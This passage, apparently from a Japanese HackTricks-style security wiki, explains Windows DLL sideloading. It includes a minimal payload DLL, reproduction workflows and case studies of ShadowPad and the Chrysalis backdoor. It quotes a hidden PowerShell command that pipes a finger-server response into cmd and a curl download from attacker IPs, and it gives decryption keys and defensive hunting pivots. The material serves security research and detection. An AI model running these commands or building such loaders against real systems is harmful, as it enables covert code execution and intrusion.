- dropper は、正規の signed EXE と malicious DLL を同じ directory に書き込む（例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- signed EXE が起動されると、Windows DLL search order により working directory から最初に wsc.dll が読み込まれ、signed parent の下で attacker code が実行される（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- executables または VBScript を実行するエントリを探す。疑わしい pattern の例: LaunchApplication が background で embedded file を実行する。
- Orca (Microsoft Orca.exe) で、CustomAction, InstallExecuteSequence, Binary tables を確認する。
- MSI CAB 内の embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- または lessmsi を使う: lessmsi x package.msi C:\out
- VBScript CustomAction により連結・復号される複数の小さな fragment を探す。Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- 次の2つのファイルを同じフォルダに置く:
- wsc_proxy.exe: 正規の署名付きホスト (Avast)。このプロセスは、自身のディレクトリから名前で wsc.dll をロードしようとする。
- wsc.dll: attacker DLL。特定の export が不要なら DllMain だけで十分。必要な場合は proxy DLL を作成し、必要な export を正規ライブラリへ forward しつつ、payload を DllMain で実行する。
- 最小限の DLL payload をビルドする:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- export 要件については、proxying framework（例: DLLirant/Spartacus）を使用して、ペイロードも実行する forwarding DLL を生成する。

- この technique は、host binary による DLL name resolution に依存する。host が absolute paths や safe loading flags（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使う場合、hijack は失敗する可能性がある。
- KnownDLLs、SxS、forwarded exports は precedence に影響しうるため、host binary と export set の選定時に考慮する必要がある。

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point は、Ink Dragon が ShadowPad を展開するために、正規 software に紛れ込ませつつ core payload を disk 上で encrypted のまま保持する **three-file triad** を使っていると説明した。

1. **Signed host EXE** – AMD、Realtek、NVIDIA などの vendor が悪用される（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は executable を Windows binary に見せかける名前（例: `conhost.exe`）に改名するが、Authenticode signature は有効なままである。
2. **Malicious loader DLL** – EXE の隣に、想定される名前（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）で配置される。DLL は通常、ScatterBrain framework で obfuscate された MFC binary であり、役割は encrypted blob を見つけて decrypt し、ShadowPad を reflectively map することだけである。
3. **Encrypted payload blob** – 多くの場合、同じ directory 内に `<name>.tmp` として保存される。decrypted payload を memory-map した後、loader は TMP file を delete して forensic evidence を破壊する。

Tradecraft notes:

* Signed EXE を（PE header 内の元の `OriginalFileName` は保持したまま）改名すると、Windows binary のように masquerade しつつ vendor signature を保持できるため、実際には AMD/NVIDIA utility であるのに `conhost.exe` に見える binary を落とすという Ink Dragon の手口を再現する。
* executable は trusted のままなので、allowlisting control の多くは malicious DLL がその隣に置かれているだけで通過してしまう。loader DLL の customization に注力し、signed parent は通常そのまま実行できる。
* ShadowPad の decryptor は、mapping 後に file を zero にするため、TMP blob が loader の隣にあり、かつ writable であることを期待する。payload が load されるまで directory は writable のままにしておき、memory 上に載った後は OPSEC のため TMP file を safely delete してよい。

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operator は DLL sideloading と LOLBAS を組み合わせ、disk 上の custom artifact を trusted EXE の隣に置かれる malicious DLL だけにする。

- **Remote command loader (Finger):** Hidden PowerShell が `cmd.exe /c` を起動し、Finger server から command を取得して `cmd` に pipe する:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` は TCP/79 の text を取得し、`| cmd` が server response を実行するため、operator は second stage server-side を切り替えられる。

- **Built-in download/extract:** archive を benign extension で download し、unpack して、random な `%LocalAppData%` folder の下に sideload target と DLL を配置する:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` は progress を隠し、redirect を follow する。`tar -xf` は Windows の built-in tar を使う。

- **WMI/CIM launch:** WMI 経由で EXE を起動し、telemetry には CIM-created process として記録させつつ、colocated DLL を load させる:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- local DLL を優先する binary（例: `intelbq.exe`、`nearby_share.exe`）で機能する。payload（例: Remcos）は trusted name の下で実行される。

- **Hunting:** `forfiles` で `/p`、`/m`、`/c` が同時に現れる場合に alert する。admin script 以外では珍しい。

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近の Lotus Blossom の intrusion は、trusted な update chain を悪用して、DLL sideload と完全 in-memory payload を stage する NSIS-packed dropper を配布した。

Tradecraft flow
- `update.exe` (NSIS) は `%AppData%\Bluetooth` を作成し、**HIDDEN** 属性を付与し、名前を変えた Bitdefender Submission Wizard の `BluetoothService.exe`、悪意ある `log.dll`、および encrypted blob `BluetoothService` を配置してから EXE を起動する。
- host EXE は `log.dll` を import し、`LogInit`/`LogWrite` を呼び出す。`LogInit` は blob を mmap-load し、`LogWrite` は **0x19660D** / **0x3C6EF35F** という定数と、以前の hash から導出された key material を使う custom な LCG-based stream で decrypt し、buffer を plaintext shellcode で上書きして temp を free し、その先へ jump する。
- IAT を避けるため、loader は export name を **FNV-1a basis 0x811C9DC5 + prime 0x1000193** で hash し、その後 Murmur-style avalanche (**0x85EBCA6B**) を適用して salted target hash と比較することで API を resolve する。

Main shellcode (Chrysalis)
- key `gQ2JR&9;` を使って add/XOR/sub を 5 回繰り返し、PE-like な main module を decrypt し、その後 `Kernel32.dll` → `GetProcAddress` を動的に load して import resolution を完了する。
- 文字ごとの bit-rotate/XOR transform により DLL name string を runtime で再構築し、その後 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` を load する。
- 2 つ目の resolver は **PEB → InMemoryOrderModuleList** をたどり、各 export table を 4-byte block 単位で Murmur-style mixing 付きで解析し、hash が見つからない場合のみ `GetProcAddress` に fallback する。

Embedded configuration & C2
- Config は drop された `BluetoothService` file の **offset 0x30808**（size **0x980**）にあり、key `qwhvb^435h&*7` で RC4-decrypt され、C2 URL と User-Agent が明らかになる。
- Beacon は dot-delimited の host profile を構築し、tag `4Q` を前置し、key `vAuig34%^325hGV` で RC4-encrypt してから HTTPS 経由で `HttpSendRequestA` を行う。Response は RC4-decrypt され、tag switch（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）で処理される。
- Execution mode は CLI args で分岐する。引数なし = `-i` を指す persistence（service/Run key）を install。`-i` は自分自身を `-k` 付きで再起動する。`-k` は install をスキップして payload を実行する。

Alternate loader observed
- 同じ intrusion では Tiny C Compiler も配置され、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` を `libtcc.dll` と並べて実行していた。攻撃者提供の C source は shellcode を埋め込み、compile して、PE を disk に触れずに in-memory で実行した。次の方法で再現する:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- この TCC-based compile-and-run stage は `Wininet.dll` を runtime で import し、hardcoded URL から second-stage shellcode を取得して、compiler run を装う flexible loader を提供していた。

## Signed-host sideloading with export proxying + host thread parking

Some DLL sideloading chains add **stability engineering** so the legitimate host stays alive long enough to load later stages cleanly instead of crashing after the malicious DLL is loaded.

Observed pattern
- Trusted EXE を malicious DLL の横に、`version.dll` のような期待される dependency name を使って配置する。
- malicious DLL は、期待されるすべての export を real system DLL（例: `%SystemRoot%\\System32\\version.dll`）へ **proxy** し、import resolution が成功し続けるようにして host process を動作維持する。
- load 後、malicious DLL は host entry point を **patch** し、main thread が exit したり process を終了させる code path を実行したりせず、無限 `Sleep` loop に入るようにする。
- 新しい thread が実際の malicious work を行う: 次 stage の DLL name や path を decrypt（RC4/XOR が一般的）し、その後 `LoadLibrary` で起動する。

Why this matters
- 通常の DLL proxying は API compatibility を保つが、later stages のために host が十分長く生き続けることまでは保証しない。
- main thread を `Sleep(INFINITE)` に parking するのは、loader が worker thread で decryption、staging、または network bootstrap を行っている間、signed process を resident に保つシンプルな方法。
- `DllMain` だけを注視して hunt していると、interesting behavior が host entry point の patch 後に発生し、secondary thread が開始される場合、この pattern を見逃す。

Minimal workflow
1. signed host EXE をコピーし、local directory から解決される DLL を特定する。
2. 同じ functions を export し、それらを legitimate DLL に forward する proxy DLL を build する。
3. `DllMain(DLL_PROCESS_ATTACH)` で worker thread を作成する。
4. その thread から host entry point または main thread start routine を patch し、`Sleep` で loop させる。
5. 次 stage の DLL name/config を decrypt し、`LoadLibrary` または manual-map で payload を実行する。

Defensive pivots
- `System32` ではなく、自身の application directory から `version.dll` や同様の common libraries を load する signed processes。
- image load の直後に process entry point へ行われる memory patches、特に `Sleep`/`SleepEx` へ redirected された jumps/calls。
- proxy DLL によって作成された threads が、decrypt された name を持つ second DLL に対して直ちに `LoadLibrary` を呼ぶ。
- `ProgramData`、`%TEMP%`、または unpacked archive paths のような writable staging directories 内で、vendor executables の横に置かれた full-export proxy DLL。

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
